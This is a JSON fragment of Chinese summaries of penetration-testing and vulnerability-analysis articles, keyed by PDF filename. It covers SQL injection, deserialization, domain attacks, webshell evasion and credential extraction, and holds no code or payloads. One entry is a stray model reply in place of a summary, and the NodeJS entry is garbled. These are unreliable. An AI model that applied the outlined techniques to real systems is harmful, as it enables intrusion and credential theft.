        "page_content": "**主题：** 使用 Drozer 审计 Android 应用程序\n\n**内容：** 本文档介绍了如何使用 Drozer 框架审计 Android 应用程序，包括安装和配置 Drozer、使用 Drozer 命令查找攻击面、检测漏洞以及修复建议。文档还提供了两个实践案例，展示了如何利用暴露的活动实现登录绕过以及如何检测广播组件拒绝服务漏洞。",
        "FileName": "7040-学习使用drozer审计安卓app.pdf"
    },
    {
        "page_content": "SSRF（服务端请求伪造）是一种攻击，攻击者可以利用服务端提供的从其他服务器获取数据的功能，绕过对目标地址的严格过滤和限制，从而发起请求并返回目标地址请求的数据。SSRF通常针对无法从外网访问的内网，通过SSRF攻击，可以访问内网的redis、mysql、smtp、fastcgi等服务。",
        "FileName": "11215-浅析SSRF的各种利用方式.pdf"
    },
    {
        "page_content": "该文档总结了 15 个有用的 BurpSuite 插件，涵盖了信息收集、漏洞检测、验证码破解和越权检测等方面，旨在帮助渗透测试人员提高效率和准确性。",
        "FileName": "12594-Burp插件梳理总结.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2023-25194 漏洞，该漏洞影响 Apache Kafka 版本 2.4.0 至 3.3.2，并详细介绍了利用 JNDI 注入触发计算器的过程。文档还提供了代码审计和动态调试步骤，以帮助理解漏洞的根源和触发点。",
        "FileName": "12852-Kafka JNDI注入漏洞分析.pdf"
    },
    {
        "page_content": "Apache Solr 启动过程涉及 Jetty 容器的启动，包括加载 JAR 包、创建 ClassLoader 和处理请求的 Handler 链。Solr 作为 Jetty 中的 WebApp，通过 SolrDispatchFilter 初始化，加载 solr.xml 配置文件，创建 CoreContainer 并加载核心配置，最终完成 Solr 的启动。",
        "FileName": "9247-Apache Solr 启动过程源码分析.pdf"
    },
    {
        "page_content": "文档探讨了使用 angr 进行漏洞挖掘，重点关注栈溢出漏洞的探索。它提出了一种新的方法，通过检测栈数据异常来发现漏洞，同时允许函数继续执行，从而能够探索多个漏洞。该方法通过存储函数的正确 rbp 值、检测栈溢出并还原栈数据来实现。",
        "FileName": "7274-初探利用angr进行漏洞挖掘（上）.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何渗透一个多层内网靶场，包括利用 weblogic 漏洞获取初始访问权限、使用 EternalBlue 和 Doublepulsar 漏洞上线目标主机、利用 GPP 组策略漏洞获取域用户密码、生成票据、利用 cve2021-42287 漏洞获取域控管理员 hash 密码、利用 cve-2021-1675 漏洞上线域控、利用 cve2020-1472 漏洞空密码连接域控、导出注册表值、恢复密码、查询约束委派服务账户、利用 fscan 获取密码、获取机器账户 hash、收集域内 DNS 信息、导出 ntds.dit 文件、直接利用脚本导出 hash、进行权限维持等技术。",
        "FileName": "12108-内网靶场--多层内网渗透.pdf"
    },
    {
        "page_content": "本文探讨了网络空间搜索引擎在信息收集中的应用，并提出了一个信息收集框架，该框架利用 SSL 信息、标题信息和 favicon 信息等归属特征，结合分布规律分析，以提高目标资产的覆盖度和发现更隐蔽资产的能力。该框架还包括基于 IP 和 IP+域名的 Web 服务发现方法，以进一步扩大信息收集范围。",
        "FileName": "9508-实践网络空间搜索引擎应用&信息收集.pdf"
    },
    {
        "page_content": "该文档分析了 fastadmin 后台低权限拿 shell 的漏洞，该漏洞利用了 fastadmin 鉴权流程中的漏洞，通过修改 POST 请求中的参数，可以执行任意 SQL 语句，从而获取管理员信息并构造 keeplogin 值进行自动登录，最终提升权限并获取 shell。",
        "FileName": "8360-fastadmin 后台注入分析.pdf"
    },
    {
        "page_content": "本文档介绍了 .NET 中的序列化和反序列化过程，包括内置库中可序列化的类型、序列化和反序列化生命周期、回调事件以及 ysoserial.net 工具的使用。",
        "FileName": "9591-dotnet serialize 101.pdf"
    },
    {
        "page_content": "Atlassian Bitbucket Server 和 Data Center 存在命令注入漏洞 (CVE-2022-43781)，允许具有控制其用户名权限的攻击者在系统上执行任意命令，影响版本为 Bitbucket Data Center and Server 7.0 到 7.21，以及 Bitbucket Server 和 Data Center 8.0 到 8.4（如果设置了 mesh.enabled=false）。该漏洞利用环境变量进行命令注入，通过注册一个带有环境变量的用户名，然后在仓库中执行 diff 操作，可以成功在 /tmp 目录下创建 test 文件。",
        "FileName": "11902-Bitbucket Server and Data Center 命令注入漏洞（CVE-2022-43781）.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 MySQL exp() 函数进行 SQL 注入，通过将 E 提升为指定数字 X 的幂，当 X 大于 709 时，函数会引起溢出错误。利用 ~ 运算符按位取反可以得到一个最大值，然后通过 exp() 函数报错并返回想要获取的数据，包括表名、列名和数据内容。该方法适用于 MySQL 5.5.5 及以上版本，但需要注意的是，在 MySQL 5.5.53 之后，exp() 报错不能返回查询结果，而只会得到一个报错。",
        "FileName": "9849-如何使用 MySQL exp() 函数进行 Sql 注入.pdf"
    },
    {
        "page_content": "该文档介绍了一种自研的内存马查杀工具 Memshell_Kill，该工具可以发现攻击者的攻击行为，并在不重启的情况下杀掉内存马，且可以跨 context 使用。该工具通过反射调用 Tomcat 和 Spring 中的关键属性和方法，来检测和清除内存马，包括监听器、控制器和拦截器。该工具解决了 Tomcat 和 Spring 内存马的查杀问题，使蓝队师傅们在面对内存马时不再只能使用重启大法。",
        "FileName": "12808-自研内存马查杀工具Memshell_Kill.pdf"
    },
    {
        "page_content": "**主题：** Tuzicms CMS 漏洞复现分析\n\n**内容：** 该文档详细介绍了 Tuzicms CMS 中发现的四种漏洞，包括 SQL 注入、Getshell、任意文件删除和前台反射 XSS，并提供了漏洞利用的具体步骤和分析。",
        "FileName": "10872-某cms复现学习.pdf"
    },
    {
        "page_content": "该文档分析了若依后台管理系统中定时任务功能点绕过黑/白名单执行任意 SQL 语句的漏洞，该漏洞源于对黑/白名单判断的遗漏，导致攻击者可以通过调用 Spring 容器中的 JdbcTemplate.execute 方法，使用 MySQL 预处理和 hex 编码绕过对方法参数的截取，从而执行任意 SQL 语句。",
        "FileName": "11336-定时任务功能点绕过黑白名单执行任意sql语句.pdf"
    },
    {
        "page_content": "本文探讨了 Webshell 免杀技术，重点关注可变函数、反射和类与继承等 PHP 特性。通过利用这些特性，可以绕过安全狗和 D 盾等查杀引擎，实现 Webshell 免杀，从而在渗透测试中获得目标权限。",
        "FileName": "8684-Webshell免杀的思考与学习.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Axis2 高版本中 URL 解析错误和修改 service.xml 文件的方法来对 Axis2 高版本进行 Getshell，从而实现远程代码执行。该方法利用了 Axis2 1.6.2 版本中 service.xml 配置的变化，通过替换 URL 并修改 aar 包中的 service.xml 文件，绕过了 The ServiceClass object does not implement the required method in the following form: OMElement info(OMElement e) 方法，最终成功获得了远程代码执行权限。",
        "FileName": "12718-Axis2 高版本Getshell方法.pdf"
    },
    {
        "page_content": "本文档详细介绍了如何分析和破解一个使用 JavaScript 加密的网站，包括识别加密函数、分析加密代码、使用明文传输和中间代理进行自动加密等步骤。",
        "FileName": "12720-记一次不存在的加解密实战渗透.pdf"
    },
    {
        "page_content": "本文分析了三个 XSS 实例，重点关注绕过长度限制和 if 逻辑判断的思路。第一个实例通过 eval(name) 绕过长度限制，第二个实例通过巧妙利用可控变量和 eval 绕过限制，第三个实例通过覆盖 getElementById 变量绕过 if 判断，执行 else 中的代码。这些实例展示了 XSS 攻击的复杂性和需要扎实的基础和灵活的思维才能成功利用。",
        "FileName": "11845-一些BAT的XSS实例（九）番外篇.pdf"
    },
    {
        "page_content": "该文档详细分析了 CC2 攻击链，该链利用 Java 中的动态字节码加载功能，通过一系列反射调用和字节码注入，最终执行任意代码。",
        "FileName": "12544-详解CC2链.pdf"
    },
    {
        "page_content": "本文分析了 Chrome 中 AppCache 实现的漏洞，包括 FALLBACK 字段未限制源 URI 范围、跨域 URL 跳转泄露信息以及 URL 模式和前缀匹配的利用。这些漏洞允许攻击者通过精心设计的 manifest 文件，利用 AppCache 的缓存机制，进行跨域信息泄露、用户身份识别和 token 窃取等攻击。",
        "FileName": "9687-Chrome的AppCache漏洞小结.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Dubbo 2.7.6 中的反序列化漏洞，该漏洞允许攻击者通过构造恶意对象并触发其 toString 方法来执行任意代码。文档提供了漏洞的复现步骤，并讨论了官方补丁的绕过方法，建议使用严格的参数类型校验和反序列化黑名单来修复漏洞。",
        "FileName": "7969-Apache Dubbo 2.7.6 反序列化漏洞复现及分析.pdf"
    },
    {
        "page_content": "该文档分析了骑⼠ cms 中的任意文件包含到远程代码执行漏洞，该漏洞允许攻击者通过包含恶意文件来执行远程代码。文档详细介绍了漏洞的分析过程，包括如何通过请求调用存在漏洞的 assign_resume_tpl 方法，以及如何将 payload 写入日志文件并包含执行。最后，文档讨论了官方补丁的有效性，并提出了绕过补丁的可能性。",
        "FileName": "8596-骑士cms从任意文件包含到远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档提供了 xss.haozi.me 网站的通关教程，详细介绍了如何绕过各种过滤机制，包括标签闭合、事件处理、正则表达式和字符编码，以成功注入恶意代码。",
        "FileName": "12107-xss.haozi.me通关教程.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，其中利用了 SQL 注入漏洞获得了对目标网站的访问权限，并最终通过上传恶意软件成功拿下网站。渗透过程中，作者使用了各种技术，包括 SQLmap、fuzzing 和文件写入，并克服了权限提升和反病毒软件的挑战。",
        "FileName": "8491-记一次bc推广.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试的第二部分，重点介绍了利用 OpenSNS 漏洞进行攻击。攻击者通过前台 RCE、后台文件上传和后台 RCE 获得了对目标系统的访问权限。他们还利用 fpm/fastcgi 绕过了 disable_func 和 open_basedir 限制，并通过修改文件绕过了 open_basedir 限制。最后，攻击者成功获得了对目标系统的 shell 访问权限。",
        "FileName": "9936-记一次简单的渗透（二）.pdf"
    },
    {
        "page_content": "该文档分析了 x86 和 arm 架构下的 ret2csu 打法，详细介绍了如何利用 __libc_csu_init 函数控制 rdx 寄存器，从而泄露 libc 地址并劫持程序执行流。文档还提供了了两个示例程序，演示了如何使用 ret2csu 打法在 x86 和 arm 架构下进行攻击。",
        "FileName": "12727-x86&arm架构下的ret2csu.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 SSRF（服务器端请求伪造）漏洞和 Ansible Playbook 提权技术，在两个靶机上逐步获取系统权限。通过 SSRF 访问敏感路径，获取 FTP 密码和上传目录 API，读取系统文件，最终通过 PDB 调试和 Tomcat 反代漏洞上传 WAR 包获取 shell。在第二个靶机上，利用 Ansible Playbook 漏洞创建软链接，备份文件，解压并复制到可写目录，最终通过 Ansible Playbook 提权。",
        "FileName": "10811-迷糊的提权方式以及利用ssrf到最终提权靶机.pdf"
    },
    {
        "page_content": "本文介绍了一种使用 WMI 和 SMB 从远程 Windows 系统中提取凭据文件的方法。通过创建卷影副本并从该副本中复制文件，攻击者可以获取 SYSTEM、SECURITY 和 SAM 文件，从而获得凭据哈希。该方法利用了 Windows 本机管理工具，使其更难被蓝队检测到。",
        "FileName": "7851-远程提取Windows中的系统凭证.pdf"
    },
    {
        "page_content": "本文介绍了冰蝎 4.0 流量魔改的多种方法，包括使用 hex、unicode、rot13 等加密方式，以及将加密流量混淆在 XML、key-value 或 multipart 格式中。通过结合加密和传输方式，可以使通信流量更像业务数据，从而绕过防护设备的检测。",
        "FileName": "12453-冰蝎4.0流量分析及魔改.pdf"
    },
    {
        "page_content": "本文介绍了高级 XXE 攻击，该攻击利用带外交互技术 (OAST) 从易受攻击的应用程序中泄露敏感数据。通过定义外部实体并使用 XML 参数实体，攻击者可以触发交互，例如 DNS 查找或 HTTP 请求，以确认攻击的成功。本文还讨论了处理 XML 解析器限制和检索 XML 数据的技巧，例如使用 CDATA 和 FTP。",
        "FileName": "9519-盲XXE攻击 -带外交互技术(OAST) 泄露数据.pdf"
    },
    {
        "page_content": "该文档分析了 CC 链的主题和内容，包括 CC1、CC3、CC4、CC6 和 CC11 链。它描述了每个链的漏洞版本、最终有效负载流程分析和最终有效负载。",
        "FileName": "12639-CC链汇总.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 cel-go 执行 Xray YML v2 POC，包括反序列化 YML 文件、处理全局变量、生成请求和响应、执行单条规则表达式以及执行 POC 表达式。通过这些步骤，可以实现短路逻辑，避免无效请求，从而有效执行 Xray YML v2 POC。",
        "FileName": "11127-利用cel-go执行xray yml v2 poc学习.pdf"
    },
    {
        "page_content": "**主题：** CobaltStrike Stageless Beacon 生成流程分析\n\n**内容：** CobaltStrike Stageless Beacon 的生成涉及多个步骤，包括：选择输出类型、获取监听器和架构信息、修补 Beacon（处理 C2 配置文件、PE 格式、ReflectiveLoad 和引导头）、修补加载器（随机异或、构造修补内容、修补并保存文件）。该过程的关键点在于处理 C2 配置文件、ReflectiveLoad 和修补加载器，以将 Beacon 集成到加载器中。",
        "FileName": "10784-CobaltStrike逆向学习系列(2)：Stageless Beacon 生成流程分析.pdf"
    },
    {
        "page_content": "该文档分析了 MetInfo CMS 代码中的三个 SQL 注入漏洞，包括基于时间的布尔盲注和 MD5 弱类型比较漏洞。这些漏洞允许攻击者绕过身份验证并访问敏感信息。",
        "FileName": "10702-MetInfo CMS代码审计-PHP.pdf"
    },
    {
        "page_content": "该文档分析了 NodeJS 中的各种漏洞，包括用户表单收集系统、后台管理系统、实时交互系统、考试系统、联机软件、高并发量的 web 应用程序、基于 web、canvas 等多人的联机游戏、基于 web 的多人的实时聊天客户端、聊天室、图文直播、单页面浏览器应用程序、操作数据库、为前端和移动端提供基于 json 的 API 等。",
        "FileName": "11791-浅析NodeJS.pdf"
    },
    {
        "page_content": "文档分析了 Chrome Issue 2046 中 NewFixedArray 数组长度未验证漏洞，该漏洞允许攻击者创建大于预期的 FixedArray 或 FixedDoubleArray 对象，从而导致内存损坏或任意代码执行。文档还提供了利用该漏洞的 PoC 代码和缓解措施。",
        "FileName": "8269-Chrome Issue 2046 NewFixedArray 数组长度未验证漏洞分析与利用.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 CC6 反序列化漏洞，该漏洞利用了 HashMap 类中的 TiedMapEntry 类，通过修改 TiedMapEntry 中的 map 字段，可以触发 LazyMap 的 get 方法，从而执行恶意代码。该漏洞利用过程涉及使用 Transformer 链和反射技术，最终通过 HashMap 的 put 方法触发反序列化漏洞。",
        "FileName": "11562-不删除key的CC6反序列化.pdf"
    },
    {
        "page_content": "本文档探讨了 PHP 反序列化字符串逃逸，重点介绍了利用过滤函数错误导致字符变多或变少的情况。通过分析示例代码，文档阐述了如何构造恶意 payload 来控制反序列化后的值，并通过 CTF 题目加深理解，展示了字符串逃逸在实际攻击中的应用。",
        "FileName": "9895-通过CTF题目学习反序列化字符串逃逸.pdf"
    },
    {
        "page_content": "该文档介绍了使用 angr 符号执行框架在程序中保存符号向量的方法，包括在内存中保存符号向量、模拟文件输入以及使用约束和 hook 来防止路径爆炸。",
        "FileName": "12732-angr符号执行.pdf"
    },
    {
        "page_content": "**主题：** 服务器主板 IPMI BMC 漏洞挖掘\n\n**内容：** 该文档详细描述了作者对服务器主板 IPMI BMC 漏洞的挖掘过程，包括分析固件、发现 Web 登录问题、弹回 Meterpreter shell、解密密码策略等步骤。作者利用了 socflash 工具提取固件，通过 binwalk 提取文件系统，并使用 IDA Pro 分析二进制文件。通过交叉引用和暴力 grep，作者发现了登录认证中的命令注入漏洞，并利用 Meterpreter 弹回 shell。此外，作者还解密了密码策略，发现密码是使用 Blowfish 算法加密的，并使用哈希值作为密钥。",
        "FileName": "8189-一次对服务器主板IPMI BMC的漏洞挖掘.pdf"
    },
    {
        "page_content": "Fastjson 1.2.22-1.2.24 反序列化漏洞分析文档主要介绍了 Fastjson 1.2.22-1.2.24 版本中存在的反序列化漏洞，该漏洞允许攻击者通过精心构造的 JSON 输入触发恶意代码执行。文档分析了漏洞的成因、利用链和补丁措施，并提供了相应的 POC 和修复建议。",
        "FileName": "8979-Fastjson 1.2.22-1.2.24反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文档概述了如何优雅地注入 Java Agent 内存马，并提供了无需文件 agent 的注入过程。它还讨论了利用 Java Agent 技术向 JVM 内存中植入 webshell 的方法，以及如何绕过检测和扫描内存马。",
        "FileName": "11640-论如何优雅的注入Java Agent内存马.pdf"
    },
    {
        "page_content": "TP-Link TL-WR841N 无线路由器存在参数注入漏洞 (CVE-2020-35576)，允许远程经过身份验证的恶意用户在系统上执行任意命令，攻击者可利用此漏洞在系统上执行任意命令。该漏洞源于路由器提供的系统诊断工具，如 Ping 和 Traceroute，允许用户输入指令在路由器系统上执行这些命令。通过分析客户端和路由器交互过程，研究人员发现了一个命令注入问题，可以通过在 Traceroute 功能的 host 参数中注入恶意 payload 来利用。利用此漏洞，攻击者可以执行任意系统命令，包括删除文件或破坏路由器。",
        "FileName": "9458-TL-WR841N 命令注入挖掘和利用方法（CVE-2020-35576）.pdf"
    },
    {
        "page_content": "该文档介绍了四种在 Android 设备上进行动态调试的方法，包括使用 smali、Frida、jeb 和 IDA。这些方法允许开发者在运行时检查和修改应用程序的行为，从而帮助他们识别和解决问题。",
        "FileName": "7196-安卓动态调试程序的4种方法.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了内网渗透的全过程，包括外网打点、内网穿透、进入域内、攻击域主机、通过pth和ptt的方式拿下域控等步骤。文中还提供了详细的命令和操作步骤，并附有拓扑图，便于读者理解和实践。",
        "FileName": "10543-内网渗透初探(二)  内网渗透全过程重新学习.pdf"
    },
    {
        "page_content": "                    好的，我明白了。我将只输出文档的内容，而不包含主题。",
        "FileName": "7027-JAVA反序列化—FastJson组件.pdf"
    },
    {
        "page_content": "该文档介绍了使用 sqlmap 工具通过操作系统命令执行 (OS-Shell) 访问数据库服务器的方法，包括 MySQL、PostgreSQL、Microsoft SQL Server 等数据库，并详细阐述了在不同数据库环境下利用特定函数或扩展进程实现命令执行的原理和步骤。",
        "FileName": "7942-sqlmap --os-shell原理.pdf"
    },
    {
        "page_content": "EL 表达式注⼊漏洞是⼀种表达式外部可控导致攻击者注⼊恶意表达式实现任意代码执⾏的漏洞，其原理与 SpEL 、 OGNL 等表达式注⼊漏洞相同。EL 表达式注⼊漏洞的外部可控点⼊⼝通常在 Java 程序代码中，即 Java 程序中的 EL 表达式内容全部或部分是从外部获取的。",
        "FileName": "7692-浅析EL表达式注入漏洞.pdf"
    },
    {
        "page_content": "本文探讨了绕过 Windows Defender Credential Guard 的方法，该方法通过修改 lsass.exe 进程内存中的两个变量 g_fParameter_UseLogonCredential 和 g_IsCredGuardEnabled 来实现，从而允许 Mimikatz 提取明文凭证。",
        "FileName": "12097-Mimikatz与Bypass Credential Guard的记录.pdf"
    },
    {
        "page_content": "本文档介绍了如何绕过 WAF（Web 应用程序防火墙）来利用 SQL 注入漏洞。它详细描述了使用中转脚本和代理服务器绕过 SSL 证书验证的过程，并提供了针对不同数据库（如 MSSQL、MySQL）的特定编码脚本搭配方式。",
        "FileName": "10385-实战sqlmap绕过WAF.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 DCOM（分布式组件对象模型）在内网中进行横向渗透，通过 DCOM 远程执行命令，攻击者可以在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。",
        "FileName": "9691-如何利用 DCOM 进行内网横向渗透.pdf"
    },
    {
        "page_content": "该文档讲述了作者在渗透测试中发现了一个教育在线云播网站，通过爆破弱口令和目录遍历漏洞，最终成功获取了网站的shell权限。作者还分享了在渗透测试中遇到的困难和解决方法，以及提交漏洞报告的经历。",
        "FileName": "9418-记一次目录遍历带来的惊喜.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 AFL 的持久模式将进程内模糊测试与多进程工具的强大功能相结合。在该模式下，AFL 将测试用例提供给一个单独的、存活时间长的进程，该进程读取输入，将其传递给待 fuzz 的 API，并通过终止本进程通知 fuzzer 测试成功运行。最终当父进程恢复时，自定义的进程循环回到起点。",
        "FileName": "9447-Fuzz Server With AFL.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2023-23397 漏洞，该漏洞影响所有受支持的 Outlook Windows 版本，并允许攻击者通过 Outlook NTLM 泄漏窃取用户的 Net-NTLMv2 凭证哈希，而无需任何用户交互。该漏洞利用了 Outlook 中的 UNC 路径访问来发起 Net-NTLM 请求，导致用户 Net-NTLMv2 泄露。",
        "FileName": "12435-Net-NTLMv2窃取----By Outlook NTLM  Leak.pdf"
    },
    {
        "page_content": "本文探讨了 ATT&CK 矩阵在攻防中的应用，强调了防守方的挑战，并提供了攻击者执行 EXE 文件的常见方法及其变种，以及防守方如何编写规则来检测这些行为。",
        "FileName": "11347-ATT&CK矩阵的攻与防.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何利用 MySQL udf 漏洞进行提权，并提供了详细的步骤和代码示例。该漏洞允许攻击者在 MySQL 服务器上执行任意代码，从而获得系统权限。",
        "FileName": "12592-udf自动化提权.pdf"
    },
    {
        "page_content": "QCMS 是一款小型网站管理系统，存在 XSS、SQL 注入和后台 getshell 漏洞。攻击者可以通过构造恶意 payload 提交至留言处、下载管理处和模板代码预览处，从而执行任意代码、获取数据库信息和读取源码。此外，系统还存在任意文件上传和任意文件读取漏洞，攻击者可以上传恶意文件并读取敏感信息。",
        "FileName": "7269-QCMS代码审计：XSS+SQL+后台getshell.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，重点关注利用 Fofa 批量查找存在注入漏洞的网站。测试者发现了一个程序存在注入漏洞，并通过修改验证码长度参数成功重置了任意用户的密码。文档强调了在渗透测试中注意页面信息和抓包内容的重要性，并总结了测试经验。",
        "FileName": "9467-渗透(二).pdf"
    },
    {
        "page_content": "该文档介绍了 CTF 竞赛中信息收集的重要性，并提供了两个 CTF 题目的详细解决过程。第一个题目涉及使用 docker-compose 容器和敏感文件收集，而第二个题目则涉及使用 git 信息泄露。文档强调了信息收集在 CTF 竞赛中的关键作用，并提供了具体示例来说明如何有效地收集和利用信息来解决问题。",
        "FileName": "12202-CTFer成长之路之举足轻重的信息搜集.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic 12.1.3 版本中的 CVE-2019-2729 漏洞，重点关注了利用 XMLDecoder 类中的 property 和 field 标签来调用静态属性的 getter 和 setter 方法。通过寻找可以实例化任意类的 beanclass 和 staticclass，研究人员发现了三种可用于实例化任意类的类，从而可以执行命令或进行反序列化。",
        "FileName": "7116-cve-2019-2729 weblogic 12.1.3版本分析.pdf"
    },
    {
        "page_content": "**主题：** ClassCMS 1.3 自解压任意文件上传漏洞分析\n\n**内容：** 该漏洞允许攻击者通过上传包含恶意代码的压缩文件来在 ClassCMS 1.3 系统上执行任意代码。漏洞的根源在于下载Class方法中对上传文件内容的验证不严格，导致攻击者可以绕过验证并上传恶意文件。攻击者可以利用此漏洞在目标系统上获取服务器权限。",
        "FileName": "10461-ClassCMS1.3自解压任意文件上传漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2019-6445 漏洞，该漏洞影响 ntpsec 1.1.0 至 1.1.2 版本。通过配置调试模式、编译、配置和启动服务，作者使用 gdb 调试器复现了该漏洞。分析表明，该漏洞是由空指针异常引起的，具体原因是 ctl_getitem 函数中 valuep 指针未正确设置，导致在后续操作中出现空指针引用。",
        "FileName": "7691-CVE-2019-6445分析复现.pdf"
    },
    {
        "page_content": "该文档详细分析了 burpsuite 靶场 XSS 漏洞通关代码，涵盖了从初级到高级的各种 XSS 漏洞类型，包括反射型、存储型、DOM 型和 AngularJS 型 XSS 漏洞。文档还提供了利用这些漏洞窃取 cookie、修改邮箱和绕过 CSP 策略的示例 payload。",
        "FileName": "12357-burpsuite靶场XSS漏洞通关代码解析.pdf"
    },
    {
        "page_content": "通达 OA 漏洞分析报告详细介绍了通达 OA 系统中存在的任意文件删除和任意用户文件上传漏洞，这些漏洞可被利用来删除任意文件或上传任意文件，从而获取服务器权限。报告提供了漏洞的详细技术分析、利用方法和缓解措施。",
        "FileName": "8203-通达OA漏洞利用威胁分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Microsoft SQL Server Reporting Services 中的权限提升漏洞 (CVE-2020-0618)，该漏洞允许经过身份验证的用户以报表服务器服务账户的权限远程执行代码。文档提供了漏洞描述、影响版本、复现环境和详细的复现过程，包括生成有效负载、配置身份验证和使用 netcat 监听反向 shell。",
        "FileName": "7891-Microsoft SQL Server Reporting Services权限提升漏洞复现（CVE-2020-0618）.pdf"
    },
    {
        "page_content": "该文档介绍了 ChatGPTScan-SAST，一个基于 ChatGPT 的代码审计工具，并分析了 ChatGPT 在代码审计中的能力和局限性。它指出 ChatGPT 具有多文件关联和逻辑分析能力，但受限于令牌限制和对复杂问题的处理能力。该文档还讨论了 ChatGPT 在 Web 安全领域的应用，并提供了其他相关项目的链接。",
        "FileName": "12434-ChatGPTScan使用ChatGPTScan批量进行代码审计-续集.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP 5.0.x 和 5.1.x 未开启强制路由导致的远程代码执行 (RCE) 漏洞分析\n\n**内容：** 该漏洞源于 ThinkPHP 框架未开启强制路由模式，攻击者可以通过精心构造的 URL 绕过路由检查，直接访问应用程序中的任意 PHP 函数，从而执行任意代码。漏洞影响 ThinkPHP 5.0.7 至 5.0.22 和 5.1.x 版本。",
        "FileName": "8312-通俗易懂的thinkphp5.0.x 5.1.x 未开启强制路由导致RCE分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了在 fastbin 中修改 fd 的怪套路，通过分析漏洞，利用堆溢出和 off-by-one 技巧，可以将 fd 修改为 malloc_hook 或 main_arena，从而实现任意地址分配或任意地址释放。",
        "FileName": "7989-怪套路之fastbin.pdf"
    },
    {
        "page_content": "该文档记录了一次对教育网站的渗透测试，攻击者通过泄露的备份文件发现了注册点，并利用姿势上传绕过黑名单限制，上传了一句话木马，获得了网站的控制权。",
        "FileName": "8371-记一次edu站点从敏感信息泄露到getshell.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP 6 中的反序列化漏洞，该漏洞允许攻击者通过反序列化恶意数据来执行任意代码。漏洞的触发点是 `unserialize()` 函数，攻击者可以通过修改入口文件 `app/controller/Index.php` 来利用该漏洞。该漏洞利用了 `__destruct` 魔术方法和可变函数，攻击者可以通过构造一个特殊的对象来触发漏洞并执行任意代码。",
        "FileName": "9405-ThinkPHP 6 反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了文件包含漏洞的原理和利用方法，包括本地文件包含和远程文件包含，并提供了利用文件包含漏洞进行Getshell的具体步骤。此外，文档还介绍了PHP伪协议和防御文件包含漏洞的措施。",
        "FileName": "12506-关于文件包含漏洞的一些知识点.pdf"
    },
    {
        "page_content": "该文档分析了祥云杯决赛 AWD Web 环境中的漏洞，包括 SSFR 导致任意文件读写、MySQL 远程连接文件读取或本地任意 SQL 执行、反序列化、文件包含等，并提供了相应的攻击脚本。",
        "FileName": "8683-祥云杯决赛AWD Web 分析.pdf"
    },
    {
        "page_content": "该文档介绍了使用 Rust 实现 Xray HTTP PoC 扫描的详细过程，包括反序列化 Xray YML 文件、使用 serde-tuple-vec-map 库处理有序的 HashMap 变量、使用 cel-interpreter 和 cel-parser 库实现 CEL 解析引擎、执行 PoC 扫描以及遇到的挑战和解决方案。",
        "FileName": "12427-rust实现xray的http poc扫描.pdf"
    },
    {
        "page_content": "本文档概述了 Nmap 操作系统识别功能的原理和实现，该功能通过向目标机器发送多达 16 个 TCP、UDP 和 ICMP 探针来识别其操作系统。本文档介绍了 Nmap 如何解析响应中的数千个属性以生成 124 个指纹，并将其与内置指纹库进行比较。它还讨论了 Nmap 如何使用统计模型来预测开机时间和识别共享 IP ID 序列的设备。",
        "FileName": "12123-nmap os detection原理及golang实现.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试人员如何利用各种技术和漏洞，包括 DCSync、CVE 和域渗透，逐步渗透春秋云镜域靶场 Initial，最终获取三个 flag。",
        "FileName": "12115-记一次春秋云镜域渗透靶场Initial.pdf"
    },
    {
        "page_content": "本文介绍了多种内网渗透代理方法，包括 Meterpreter 的 portfwd 和 socks 代理、NATBypass、SSH 隧道、EarthWorm、frp 和基于 Web 服务的 socks 隧道。这些方法可以帮助渗透测试人员在内网中建立代理，从而绕过防火墙和网络限制，访问目标系统。",
        "FileName": "8001-浅谈内网渗透代理.pdf"
    },
    {
        "page_content": "本文介绍了 Radare2 框架及其基本操作，包括使用 rabin2 获取文件信息、使用 rasm2 进行汇编和反汇编、使用 rahash2 计算哈希值、使用 radiff2 比较二进制文件、使用 rafind2 查找文件中的内容、使用 ragg2 编译高级语言、使用 rarun2 执行程序、使用 rax2 进行进制转换和 ASCII 码转换，以及使用 radare2 进行逆向分析，包括使用 i 命令获取信息、使用 a 命令进行分析、使用 f 命令查看 flagspace、使用 s 命令快速定位、使用 ax 命令查看数据/代码间相互调用关系、使用 @@ 命令执行某命令、使用 afl 命令查看函数、使用 pd 命令反汇编函数、使用 pdc 命令反编译函数，以及在视图模式下使用 HJKL、p、g、[0-9]、d、c、i、A、:、;、/ 等键进行操作。",
        "FileName": "7265-Radare2从入门到放弃(上).pdf"
    },
    {
        "page_content": "本文档介绍了如何通过监听 445 端口来捕获 SMB 认证数据，从而获取未经身份验证的计算机的凭据。它详细介绍了使用 Windows 内置的 netsh 工具进行网络数据包捕获、将捕获的数据转换为 pcap 格式、使用 Wireshark 分析数据包以及使用 Python 脚本提取 NTLMv2 哈希值。该文档还提供了破解 NTLMv2 哈希值的步骤，并提供了示例代码。",
        "FileName": "8543-监听445端口抓v2数据.pdf"
    },
    {
